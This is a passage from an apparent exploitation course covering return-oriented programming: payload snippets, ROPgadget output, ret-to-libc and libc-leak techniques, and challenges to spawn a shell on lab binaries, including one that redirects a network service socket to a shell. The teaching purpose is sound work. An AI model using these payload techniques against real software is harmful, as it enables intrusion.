</span></span></code></pre></div><p>Now our exploit is done. In order to perform this exploit on <code>vuln64</code>, simply
run <code>objdump</code> on this binary and remember that the length of a pointer on a
64-bit architecture is 8 bytes, which means that the offset of the return
address is going to be <code>rbp + 8</code>.</p><p>One thing to keep in mind is that you are by no means required to use addresses
that point to the beginning of functions in your payloads. You can use any valid
address from the <code>.text</code> section and the exploit should work just fine in
executing code from the address you provide it.</p><p>Now on to our next scenario: what if the function we&rsquo;re calling requires a
parameter?</p><h3 id=calling-a-function-with-parameters>Calling a Function with Parameters</h3><p>Let&rsquo;s first look at the stack of a function when it&rsquo;s called &ldquo;normally&rdquo;, i.e.
with a <code>call</code> instruction. Let&rsquo;s use the <code>overwatch</code> function in <code>vuln.c</code> as an
example. The picture below shows where its parameter is placed.</p><p><img src=assets/overwatch_stack_simple.png alt="Overwatch Stack"></p><p>Furthermore, as expected, the function retrieves its parameter from address
<code>ebp + 8</code>, as shown above. How can we craft a payload so that, upon entering the
function, the required <code>0xdeadbeef</code> parameter is where the function expects it
to be?</p><p>We&rsquo;ll obviously need to place <code>0xdeadbeef</code> on the stack (in little endian
representation, of course), but where? After the function&rsquo;s preamble
(<code>push ebp; mov esp, ebp</code>), <code>ebp</code> points to the location where the previous
stack pointer it saved. Above it, the function expects to find its return
address. Thus, we need to write 4 padding bytes in its place. The next 4 bytes
are the first parameter. Just for reference, the next 4 bytes (<code>ebp + 12</code>) are
the second parameter and so on. So, in order to call <code>overwatch</code> with the
<code>0xdeadbeef</code> parameter, the payload would look like this:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>offset</span> <span style=color:#ce5c00;font-weight:700>*</span> <span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;A&#34;</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>overwatch_address</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#0000cf;font-weight:700>4</span> <span style=color:#ce5c00;font-weight:700>*</span> <span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;B&#34;</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0xdeadbeef</span><span style=color:#000;font-weight:700>)</span>
</span></span></code></pre></div><p>Take a look at those 4 <code>B</code>&rsquo;s in the payload above. We agreed that they are
<code>overwatch</code>&rsquo;s expected return address. So if we wanted to call another function,
we would only need to replace them with that function&rsquo;s address. Pretty simple,
right? But what if we wanted to call a third function? Well, then we would need
to overwrite the next 4 bytes in our payload with a third address. Easy! But now
we have actually run into trouble: the next 4 bytes are <code>overwatch</code>&rsquo;s parameter.
In this situation it looks like we <strong>either</strong> call <code>overwatch</code> or we call a third
function. Not cool. In this case, <code>overwatch</code>s stack would look like this:</p><p><img src=assets/overwatch_stack_conflict.png alt="Overwatch Stack with Conflicting Parameter/Address"></p><p>It seems we need another mechanism so that we can call <strong>all 3 functions</strong> with
all their correct parameters. Enter ROPs!</p><h3 id=calling-multiple-functions>Calling Multiple Functions</h3><p>What we need in order to solve the dilemma presented above is a means by which
to <strong>remove</strong> <code>overwatch</code>&rsquo;s parameter (i.e. <code>0xdeadbeef</code>) from the stack once
the function is finished. We know that the <code>pop</code> instruction is good for
removing stuff from the stack. So what we need is to execute the following two
instructions:</p><pre tabindex=0><code class=language-assembly data-lang=assembly>pop &lt;any_register&gt;
ret
</code></pre><p>Since <code>ret</code> is equivalent to <code>pop eip</code>, the above code removes <code>0xdeadbeef</code> from
the stack and places the instruction pointer (<code>eip</code>) at the address lying on the
stack above <code>0xdeadbeef</code>. One thing to keep in mind is that now we&rsquo;re only
interested in clearing the stack, so <code>pop</code> can be used with any 32 bit register.</p><p>As a result, <code>overwatch</code>&rsquo;s stack should look like the one in the image below.
Notice there are no more conflicts now. Hurray!</p><p><img src=assets/overwatch_stack_no_conflict.png alt="Overwatch Stack without Conflicting Parameters and Addresses"></p><h4 id=finding-gadgets---ropgadget>Finding Gadgets - <code>ROPgadget</code></h4><p>The <code>pop; ret</code> instructions above are called a <strong>gadget</strong>, i.e. a small group of
<strong>consecutive</strong> instructions that ends in <code>ret</code> and which can be used to alter
the execution of a given program. Since all binaries contain a <code>.text</code> section,
which is made up of instructions, all binaries contain gadgets. Lots of them.</p><p>The tool that we&rsquo;re going to use in order to find such gadgets is called
<code>ROPgadget</code>. It is already installed in the Kali VM and if you&rsquo;re working on
another environment, you can install it by following the instructions in the
tool&rsquo;s <a href=https://github.com/JonathanSalwan/ROPgadget>Github repo</a>.</p><p>In order to run <code>ROPgadget</code> from your terminal, you need to specify a binary
file to it using the <code>--binary</code> parameter. It is also recommended (if you know
what gadgets you&rsquo;re looking for) to filter those you need using the <code>--only</code>
parameter. As a result, in order to obtain a <code>pop; ret</code> gadget, we need to run
the following command:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ROPgadget --binary vuln --only <span style=color:#4e9a06>&#34;pop|ret&#34;</span>
</span></span><span style=display:flex><span>Gadgets <span style=color:#000>information</span>
</span></span><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>============================================================</span>
</span></span><span style=display:flex><span>0x080485eb : pop ebp <span style=color:#000;font-weight:700>;</span> ret
</span></span><span style=display:flex><span>0x080485e8 : pop ebx <span style=color:#000;font-weight:700>;</span> pop esi <span style=color:#000;font-weight:700>;</span> pop edi <span style=color:#000;font-weight:700>;</span> pop ebp <span style=color:#000;font-weight:700>;</span> ret
</span></span><span style=display:flex><span>0x08048331 : pop ebx <span style=color:#000;font-weight:700>;</span> ret
</span></span><span style=display:flex><span>0x080485ea : pop edi <span style=color:#000;font-weight:700>;</span> pop ebp <span style=color:#000;font-weight:700>;</span> ret
</span></span><span style=display:flex><span>0x080485e9 : pop esi <span style=color:#000;font-weight:700>;</span> pop edi <span style=color:#000;font-weight:700>;</span> pop ebp <span style=color:#000;font-weight:700>;</span> ret
</span></span><span style=display:flex><span>0x0804831a : ret
</span></span><span style=display:flex><span>0x0804819c : ret 0x3e41
</span></span><span style=display:flex><span>0x0804844e : ret 0xeac1
</span></span></code></pre></div><p>Thus, the payload needed in order to call both <code>overwatch</code> and <code>warcraft</code> is the
one showcased below, with <code>pop_ret_gadget_address</code> being set to <code>0x08048331</code>
from the output above.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>offset</span> <span style=color:#ce5c00;font-weight:700>*</span> <span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;A&#34;</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>overwatch_address</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>pop_ret_gadget_address</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>	<span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0xdeadbeef</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>warcraft_address</span><span style=color:#000;font-weight:700>)</span>
</span></span></code></pre></div><p>Notice this yet is another example of <strong>code reuse</strong> since we&rsquo;re reusing various
chunks of instructions already present in our binary.</p><h2 id=challenges>Challenges</h2><h3 id=01-tutorial---bypass-nx-stack-with-return-to-libc>01. Tutorial - Bypass NX Stack with return-to-libc</h3><p>Go to the <a href=activities/01-tutorial-ret-to-libc/src/>01-tutorial-ret-to-libc/</a>
folder.</p><p>In the previous sessions we used stack overflow vulnerabilities to inject new
code into a running process (on its stack) and redirect execution to it. This
attack is easily defeated by making the stack, together with any other memory
page that can be modified, non-executable. This is achieved by setting the
<strong>NX</strong> bit in the page table of the current process.</p><p>We will try to bypass this protection for the <code>01-tutorial-ret-to-libc/src/auth</code>
binary in the lab archive. For now, disable ASLR in the a new shell:</p><pre tabindex=0><code>$ setarch $(uname -m) -R /bin/bash
</code></pre><p>Let&rsquo;s take a look at the program headers and confirm that the stack is no longer
executable. We only have read and write (RW) permissions for the stack area.
The auth binary requires the <code>libssl1.0.0:i386</code> Debian package to work. You can
find <code>libssl1.0.0:i386</code> Debian package
<a href=https://packages.debian.org/jessie/i386/libssl1.0.0/download>here</a>.</p><p>First, let&rsquo;s check that <em>NX</em> bit we mentioned earlier:</p><pre tabindex=0><code>$ checksec auth
    [...]
    NX:       NX enabled
    [...]
</code></pre><p>For completeness, lets check that there is indeed a buffer (stack) overflow vulnerability.</p><pre tabindex=0><code>$ python2.7 -c &#39;print &#34;A&#34; * 1357&#39; | ltrace -i ./auth
TODO
</code></pre><p>Check the source file - the buffer length is 1337 bytes. There should be a base
pointer and the <code>main()</code>&rsquo;s return address just before it on the stack. There is
also some alignment involved, but we can easily try a few lengths to get the
right position of the return address. Seems to be 1337 + 16 followed by the
return address for this case. You can, of course, determine the distance between
the buffer&rsquo;s start address and the frame&rsquo;s return address exactly using objdump,
but we will leave that as an exercise.</p><p>We can now jump anywhere. Unfortunately, we cannot put a shellcode in the buffer
and jump into it because the stack is non-executable now. Lets try it with a few
<code>NOP</code>s. Our buffer&rsquo;s address is <code>0xbfffee63</code> (see the <code>gets()</code> call).</p><pre tabindex=0><code>$ python2.7 -c &#39;print &#34;\x90\x90\x90\x90&#34; + &#34;A&#34; * 1349 + &#34;\x63\xee\xff\xbf&#34;&#39; | ltrace -i ./auth
[0x80484f1] __libc_start_main(0x80486af, 1, 0xbffff454, 0x80486c0, 0x8048730 &lt;unfinished ...&gt;
[0x8048601] malloc(20)                                                                            = 0x0804b008
[0x80485df] puts(&#34;Enter password: &#34;Enter password: 
)                                                              = 17
[0x80485ea] gets(0xbfffee63, 0x8048601, 0x80486af, 0xb7cdecb0, 0xb7cdecb7)                        = 0xbfffee63
[0x8048652] memset(0x0804b008, &#39;\000&#39;, 20)                                                        = 0x0804b008
[0x8048671] SHA1(0xbfffee63, 137, 0x804b008, 4, 0x90000001)                                       = 0x804b008
[0xbfffee63] --- SIGSEGV (Segmentation fault) ---
[0xffffffff] +++ killed by SIGSEGV +++
</code></pre><p>Guess what? It didn&rsquo;t work&mldr; How about we try to jump to some existing code?
First, let&rsquo;s take a look at the <code>check_password()</code> function.</p><pre tabindex=0><code>$ objdump -M intel -d auth | grep -A 15 &#34;&lt;check_password&gt;:&#34;
080485ec &lt;check_password&gt;:
 80485ec:	55                   	push   ebp
 80485ed:	89 e5                	mov    ebp,esp
 80485ef:	81 ec 58 05 00 00    	sub    esp,0x558
 80485f5:	c7 04 24 14 00 00 00 	mov    DWORD PTR [esp],0x14
 80485fc:	e8 9f fe ff ff       	call   80484a0 &lt;malloc@plt&gt;
 8048601:	a3 38 a0 04 08       	mov    ds:0x804a038,eax
 8048606:	a1 38 a0 04 08       	mov    eax,ds:0x804a038
 804860b:	85 c0                	test   eax,eax
 804860d:	75 18                	jne    8048627 &lt;check_password+0x3b&gt;
 804860f:	c7 04 24 76 87 04 08 	mov    DWORD PTR [esp],0x8048776
 8048616:	e8 95 fe ff ff       	call   80484b0 &lt;puts@plt&gt;
 804861b:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 8048622:	e8 99 fe ff ff       	call   80484c0 &lt;exit@plt&gt;
 8048627:	8d 85 bb fa ff ff    	lea    eax,[ebp-0x545]
 804862d:	89 04 24             	mov    DWORD PTR [esp],eax
</code></pre><p>Lets try <code>0x804860f</code> such that we print the <code>malloc</code> failure message.</p><pre tabindex=0><code>$ python2.7 -c &#39;print &#34;A&#34; * 1353 + &#34;\x0f\x86\x04\x08&#34;&#39; | ltrace -i -e puts ./auth
[0x80485df] puts(&#34;Enter password: &#34;Enter password: 
)                                                              = 17
[0x804861b] puts(&#34;malloc failed&#34;malloc failed
)                                                                 = 14
[0xffffffff] +++ exited (status 1) +++
</code></pre><h3 id=02-challenge---ret-to-libc>02. Challenge - ret-to-libc</h3><p>So far, so good! Now let&rsquo;s get serious and do something useful with this.</p><p>Continue working in the <code>01-tutorial-ret-to-libc/</code> folder in the activities
archive.</p><p>The final goal of this task is to bypass the NX stack protection and call
<code>system("/bin/sh")</code>. We will start with a simple ret-to-plt:</p><ol><li>Display all libc functions linked with the auth binary.</li><li>Return to <code>puts()</code>. Use ltrace to show that the call is actually being made.</li><li>Find the offset of the <code>"malloc failed"</code> static string in the binary.</li><li>Make the binary print <code>"failed"</code> the second time <code>puts()</code> is called.</li><li><strong>(bonus)</strong> The process should SEGFAULT after printing <code>Enter password:</code>
again. Make it exit cleanly (the exit code does not matter, just no <code>SIGSEGV</code>).
You can move on to the next task without solving this problem.</li><li>Remember how we had ASLR disabled? The other libc functions are in the
memory, you just need to find their addresses. Find the offset of <code>system()</code> in
libc. Find the offset of the <code>"/bin/sh"</code> string in libc.</li><li>Where is libc linked in the auth binary? Compute the final addresses and call
<code>system("/bin/sh")</code> just like you did with <code>puts()</code>.</li></ol><details><summary>Hint 1</summary>
Use <code>LD_TRACE_LOADED_OBJECTS=1 ./auth</code> instead of <code>ldd</code>.
The latter is not always reliable, because the order in which it loads the
libraries might be different than when you actually run the binary.</details>
<details><summary>Hint 2</summary>
When you finally attack this, <code>stdin</code> will get closed and the new
shell will have nothing to read. Use <code>cat</code> to concatenate your attack
string with <code>stdin</code> like this:
<code>cat <(python -c 'print “L33T_ATTACK”') - | ./vulnbinary</code>.<p>Note the use of the <code>-</code> (dash) character before the <code>|</code>
(pipe). This prevents the closing of the input file descriptor of the pipe when
<code>cat</code>&rsquo;s output finished (i.e. when the <code>EOF</code> character is
received).</p></details><h3 id=03-challenge---no-ret-control>03. Challenge - no-ret-control</h3><p>Go to the
<a href=/activities/03-challenge-no-ret-control/src>03-challenge-no-ret-control/</a>
folder in the activities archive.</p><p>Imagine this scenario: we have an executable where we can change at least 4
bytes of random memory, but ASLR is turned on. We cannot reliably change the
value of the return address because of this. Sometimes <code>ret</code> is not even called
at the end of a function.</p><p>Alter the execution of <code>force_exit</code>, in order to call the secret function.</p><h3 id=04-challenge---ret-to-plt>04. Challenge - ret-to-plt</h3><p>Go to the <a href=/activities/04-ret-to-plt/src>04-challenge-ret-to-plt/</a> folder in
the activities archive.</p><p><code>random</code> is a small application that generates a random number.</p><p>Your task is to build an exploit that makes the application always print the
same second random number. That is the first printed random number is whatever,
but the second printed random number will always be the same, for all runs. In
the sample output below the second printed random number is always <code>1023098942</code>
for all runs.</p><pre tabindex=0><code>hari@solyaris-home:~$ python2.7 -c &#39;print &lt;payload here&gt;&#39; | ./random
Hi! Options:
	1. Get random number
	2. Go outside
Here&#39;s a random number: 2070249950. Have fun with it!
Hi! Options:
	1. Get random number
	2. Go outside
Here&#39;s a random number: 1023098942. Have fun with it!
Segmentation fault (core dumped)
hari@solyaris-home:~$ python2.7 -c &#39;print &lt;payload here&gt;&#39; | ./random
Hi! Options:
	1. Get random number
	2. Go outside
Here&#39;s a random number: 1152946153. Have fun with it!
Hi! Options:
	1. Get random number
	2. Go outside
Here&#39;s a random number: 1023098942. Have fun with it!
</code></pre><p>You can use the Python skeleton given in section <a href=#nop-analogy>NOP Analogy</a> for
the buffer overflow input.</p><p><strong>Bonus:</strong> The process should SEGFAULT after printing the second (constant)
number. Make it exit cleanly (the exit code does not matter, just no <code>SIGSEGV</code>).</p><h3 id=05-challenge---gadget-tutorial>05. Challenge - gadget tutorial</h3><p>This task requires you to construct a payload using gadgets and calling the
functions inside such that it will print</p><pre tabindex=0><code>Hello!
stage A!stage B!
</code></pre><p>Make it also print the messages in reverse order:</p><pre tabindex=0><code>Hello!
stage B!stage A!
</code></pre><h3 id=06-bonus-challenge---echo-service>06. Bonus Challenge - Echo service</h3><p>This task is a network service that can be exploited. Run it locally and try to
exploit it. You&rsquo;ll find that if you call <code>system("/bin/sh")</code> the shell is opened
in the terminal where the server was started instead of the one where the attack
takes place. This happens because the client-server communication takes place
over a socket. When you spawn a shell it will inherit the Standard I/O
descriptors from the parent and use those. To fix this you need to redirect the
socket fd into 0,1 (and optionally 2).</p><p>So you will need to do the equivalent of the following, as part of a ROP chain:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#000>dup2</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>sockfd</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span><span style=color:#000>dup2</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>sockfd</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span><span style=color:#000>system</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;/bin/sh&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span></code></pre></div><p>Exploit it first with ASLR disabled and then with it enabled.</p><h2 id=conclusions>Conclusions</h2><p>At the end of this session, you should:</p><ul><li>Understand the limitations of classic buffer overflow attacks, as well as
shellcodes.</li><li>Understand and visualise the effect of various simple ROP attacks on a
program&rsquo;s stack</li><li>Be able to craft and make use of ROP chains in order to hack vulnerable
binaries</li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-847dcd12c4f5b8e13e79183e8e054749>8 -</h1><h1 id=return-oriented-programming-advanced>Return Oriented Programming Advanced</h1><h2 id=table-of-contents>Table of Contents</h2><ul><li><a href=#return-oriented-programming-advanced>Return Oriented Programming Advanced</a><ul><li><a href=#calling-conventions-in-the-rop-context>Calling Conventions in the ROP Context</a></li><li><a href=#rop-gadgets-on-x86_64>ROP gadgets on x86_64</a></li><li><a href=#libc-leaks>Libc leaks</a></li><li><a href=#challenges>Challenges</a><ul><li><a href=#01-challenge---using-rop-to-leak-and-call-system>01. Challenge - Using ROP to Leak and Call system</a></li><li><a href=#02-challenge---handling-low-stack-space>02. Challenge - Handling Low Stack Space</a></li><li><a href=#03-challenge---stack-pivoting>03. Challenge - Stack Pivoting</a></li><li><a href=#04-challenge---mprotect>04. Challenge - mprotect</a></li></ul></li><li><a href=#further-reading>Further Reading</a></li></ul></li></ul><p>In this lab we are going to dive deeper into <em>Return Oriented Programming</em> and setbacks that appear in modern exploitation. Topics covered:</p><ul><li>ROP for syscalls and 64 bits</li><li>Dealing with ASLR in ROP</li><li>Dealing with low space in the overflown buffer</li><li>Combining ROP and shellcodes</li></ul><p>As the basis of the lab we will use a program based on a classical CTF challenge called <em>ropasaurusrex</em> and gradually make exploitation harder.</p><h2 id=calling-conventions-in-the-rop-context>Calling Conventions in the ROP Context</h2><p>As you know, the calling convention for 32 bits uses the stack. This means that setting up parameters is as easy as just writing them in the payload.</p><p>We can see how a function call is generated in this <a href=https://gcc.godbolt.org/z/MPG5MhEnE>Compiler Explorer example</a>.</p><p>Syscalls are special, the arguments are passed using the registers and <code>int 0x80</code> or the equivalent <code>call DWORD PTR gs:0x10</code> is used such that more work is needed: <code>pop ?; ret</code> gadgets are needed to load the registers with the desired values.</p><p>In the assembly below you see a disassembly of the calling of a system call <code>read(0, 0x8048000, 0x100)</code>, with the system call in the <code>eax</code> register and the system call arguments in the other registers:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#000>mov</span> <span style=color:#000>eax</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0x3</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span> <span style=color:#000>ebx</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span> <span style=color:#000>ecx</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0x08048000</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span> <span style=color:#000>edx</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0x100</span>
</span></span><span style=display:flex><span><span style=color:#000>int</span> <span style=color:#0000cf;font-weight:700>0x80</span>
</span></span></code></pre></div><p>The calling convention for 64 bit processors (<code>x86_64</code>) is different and mainly uses registers instead of the stack, see this <a href=https://gcc.godbolt.org/z/1Ys6M3Pdc>Compiler Explorer example</a>.</p><p>Syscalls on 64 bits are conceptually the same as on 32 bits, but it uses different registers, different syscall codes and the <code>syscall</code> mnemonic is used for making a system call:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#000>mov</span> <span style=color:#000>rax</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span> <span style=color:#000>rdi</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span> <span style=color:#000>rsi</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0x08048000</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span> <span style=color:#000>rdx</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0x100</span>
</span></span><span style=display:flex><span><span style=color:#000>syscall</span>
</span></span></code></pre></div><h2 id=rop-gadgets-on-x86_64>ROP gadgets on x86_64</h2><p>On <code>x86_64</code> the ROP payloads will have to be built differently than on <code>x86</code> because of the different calling convention. Having the function arguments stored in registers means that you don&rsquo;t need to do stack cleanup anymore, but you will need gadgets with <strong>specific registers</strong> to pop the arguments into.</p><p>For example to do the <code>read(0, buf, size)</code> <em>libc call</em> to do this call your payload will need to look like:</p><pre tabindex=0><code>pop rdi; ret
0
pop rsi, ret
buf_addr
pop rdx; ret
size
call read@plt
</code></pre><h2 id=libc-leaks>Libc leaks</h2><p>You might have already encountered in other tasks the need to leak values or addresses. Most of the time, if you want to get a shell, you won&rsquo;t have a convenient <code>system@plt</code> symbol present in your binary, and ASLR will most often be activated; so you will have to compute it relative to another libc symbol at runtime.</p><p>For this we will need to know what libc library the program is loading. For a local executable we can just run <code>ldd</code>:</p><pre tabindex=0><code>$ ldd rop
    linux-vdso.so.1 (0x00007ffd0834b000)
    libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007fec18eb6000)
    /lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fec190aa000)
</code></pre><p>For remote tasks you can might get an attached <code>libc.so</code>, or you can use the <a href=https://libc.blukat.me/>Libc database</a> to find the correct libc based on some leaked offsets.</p><p>How to compute and use the <code>system</code> function address using pwntools:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#204a87;font-weight:700>from</span> <span style=color:#000>pwn</span> <span style=color:#204a87;font-weight:700>import</span> <span style=color:#ce5c00;font-weight:700>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>libc</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>ELF</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;/usr/lib/libc.so.6&#34;</span><span style=color:#000;font-weight:700>)</span> <span style=color:#8f5902;font-style:italic># from `ldd rop`</span>
</span></span><span style=display:flex><span><span style=color:#000>p</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>process</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;rop&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>...</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># read the leaked address of the write@got function from the program</span>
</span></span><span style=display:flex><span><span style=color:#000>write_leak</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>u64</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>p</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>recv</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>8</span><span style=color:#000;font-weight:700>))</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># compute the starting address of the libc library</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># setting libc.address to this value will offset all future symbol accesses</span>
</span></span><span style=display:flex><span><span style=color:#000>libc</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>address</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>write_leak</span> <span style=color:#ce5c00;font-weight:700>-</span> <span style=color:#000>libc</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>symbols</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;write&#39;</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># use the address of system in the payload</span>
</span></span><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#ce5c00;font-weight:700>...</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>p64</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>libc</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>symbols</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;system&#39;</span><span style=color:#000;font-weight:700>])</span>
</span></span></code></pre></div><h2 id=challenges>Challenges</h2><p><strong>NOTE</strong>: All tasks from this session are 64 bit binaries, so take that into consideration when you build the ROP chains.</p><h3 id=01-challenge---using-rop-to-leak-and-call-system>01. Challenge - Using ROP to Leak and Call system</h3><p>Use the <code>01-leak-call-system/src</code> executable file in order to spawn a shell.</p><p>You can now call the functions in the binary but <code>system</code> or any other appropriate function is missing and ASLR is enabled. How do you get past this? You need an information leak! To leak information we want to print it to standard output and process it.
We use calls to <code>printf</code>, <code>puts</code> or <code>write</code> for this. In our case we can use the <code>write</code> function call.</p><blockquote><p>If you have a string representation of a number you can unpack it using the <code>unpack</code>/<code>u64</code> function in pwntools. It is the reverse of the <code>pack</code>/<code>p64</code> function.</p></blockquote><p>First, trigger the information leak by calling the <code>write</code> function and leaking an address from libc.</p><blockquote><p>You can use the GOT table storing libc addresses.</p></blockquote><p>You need to read the output from the above <code>write</code> call. Use <code>p.recv(8)</code> in the Python script to read the 8 bytes output of the <code>write</code> call in the ROP chain.</p><blockquote><p>Remember that you need gadgets to pop values into rdi, rsi, rdx for the <code>write</code> call.</p></blockquote><p>Find the address of the <code>system</code> call.</p><blockquote><p>Remember the libc leaks section above</p></blockquote><p>Call <code>system</code>.</p><blockquote><p>You can&rsquo;t write the <code>system</code> address in the ROP chain as it is different each time and the ROP chain is statically defined. You can use the GOT table again. Write an entry in the GOT table with the newly found address and call the function for that entry. It will evolve into a call to <code>system</code>.</p><p>To write an entry in the GOT table use the <code>read</code> call in the ROP chain. You will feed to <code>read</code> the computed address below.</p><p>For the actual parameter use the <code>"sh"</code> string already present in the vulnerable binary. Use searchmem in GDB to find the <code>"sh"</code> string in the executable.</p></blockquote><h3 id=02-challenge---handling-low-stack-space>02. Challenge - Handling Low Stack Space</h3><p>The previous binary had the luxury of plenty of stack space to be overflown. It is often the case that we don&rsquo;t have enough space for a long ROP chain. Let&rsquo;s handle that.</p><p>For the current task, switch to the <code>02-low-stack-space/src</code> sub-folder. The extra constraint here is that huge ropchains are no longer an option.</p><p>Find out how much space you have in the overflow and assess the situation.</p><blockquote><p>Use <code>gdb</code> and the cyclic pattern to get the information required.</p></blockquote><p>Now follow the steps below.</p><p>First trigger the info leak as before.</p><blockquote><p>Use <code>write</code> and leak the address of a GOT value. Use this to compute the address of the <code>system</code> call.</p></blockquote><p>You can only construct a partial ropchain. A longer one won&rsquo;t fit. So after calling <code>write</code>, call <code>main</code> again.</p><blockquote><p>Note that using <code>sendline</code> means sending out a newline character (<code>'\n'</code>) at the end of the message. If you want to strictly send out a message without a newline, use <code>send</code>.</p><p>Find the address of <code>main</code> by looking at the argument for the <code>__libc_start_main</code> function. Check the disassembling of the program and see what is the parameter passed to the <code>__libc_start_main call</code>.</p><p>After calling <code>main</code> again you will get back to the initial situation where you can exploit the buffer overflow.</p></blockquote><p>Insert <code>"sh"</code> string.</p><blockquote><p>This time you don&rsquo;t have the <code>"sh"</code> string in the binary, but you can find it in <strong>the libc binary itself</strong> so you can compute it the same way you compute the <code>system</code> address. In pwntools:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>
